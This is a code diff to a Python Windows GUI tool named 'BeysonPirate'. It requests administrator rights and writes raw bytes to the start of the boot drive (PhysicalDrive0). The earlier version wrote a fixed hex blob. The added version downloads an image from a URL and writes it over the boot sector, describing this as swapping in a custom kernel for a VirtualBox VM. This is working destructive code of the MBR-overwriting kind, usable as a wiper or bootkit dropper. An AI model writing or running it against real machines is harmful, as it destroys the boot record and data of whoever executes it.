@@ -2,6 +2,7 @@ import tkinter as tk
 import os
 import ctypes
 import sys
+import urllib.request  # Added for downloading
 from ctypes import wintypes
 
 def is_admin():
@@ -22,33 +23,59 @@ if sys.platform == "win32":
         elevate()
         sys.exit()
 
-# run pirate analysis
-# run devosmod
-# set MSH-Shell-TypeExecutionrun
-
 def run():
-    hex_data = bytes.fromhex("44bc2025510d89116f37f90f4504133523d06954ea780336ca")
+    # --- 1. DOWNLOAD THE KERNEL ---
+    # Replace this URL with the direct link to your kernel.img
+    kernel_url = "https://example.com/your_kernel.img"
+    
+    print("Downloading kernel image...")
+    try:
+        with urllib.request.urlopen(kernel_url) as response:
+            kernel_data = response.read()
+        print(f"Downloaded {len(kernel_data)} bytes.")
+    except Exception as e:
+        print(f"Download failed: {e}")
+        return
 
+    # --- 2. SETUP THE SYSTEM BRIDGE ---
     dll = type('DLL', (), {})()
     dll.Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
 
-    # These lines fix the "Access Violation" by defining the memory map
+    # Define types to prevent memory crashes
     dll.Kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
     dll.Kernel32.CreateFileW.restype = wintypes.HANDLE
     dll.Kernel32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
     dll.Kernel32.WriteFile.restype = wintypes.BOOL
 
-    # Open the physical drive
-    hDevice = dll.Kernel32.CreateFileW(r'\\.\PhysicalDrive0', 0x40000000, 0x00000001 | 0x00000002, None, 3, 0, 0)
+    # --- 3. OVERWRITE THE DRIVE ---
+    # Opening PhysicalDrive0 (The Boot Drive)
+    hDevice = dll.Kernel32.CreateFileW(r'\\.\PhysicalDrive0', 0x40000000, 0x01 | 0x02, None, 3, 0, 0)
 
     if hDevice != wintypes.HANDLE(-1).value:
         written = wintypes.DWORD(0)
-        # We pass ctypes.byref(written) instead of None to prevent the crash
-        dll.Kernel32.WriteFile(hDevice, hex_data, len(hex_data), ctypes.byref(written), None)
+        
+        # We write the downloaded kernel_data instead of the old hex string
+        success = dll.Kernel32.WriteFile(
+            hDevice, 
+            kernel_data, 
+            len(kernel_data), 
+            ctypes.byref(written), 
+            None
+        )
+        
+        if success:
+            print("Successfully replaced Windows bootloader with custom kernel.")
+            print("You can now restart the VirtualBox VM.")
+        else:
+            print(f"Write failed. Error: {ctypes.get_last_error()}")
+            
         dll.Kernel32.CloseHandle(hDevice)
+    else:
+        print(f"Failed to open drive. Error: {ctypes.get_last_error()}")
 
+# UI Setup
 root = tk.Tk()
-root.title("BeysonPirate")
+root.title("BeysonPirate - Kernel Swapper")
 root.geometry("240x120")
 root.resizable(False, False)
 root.configure(bg="#f9f9f8")
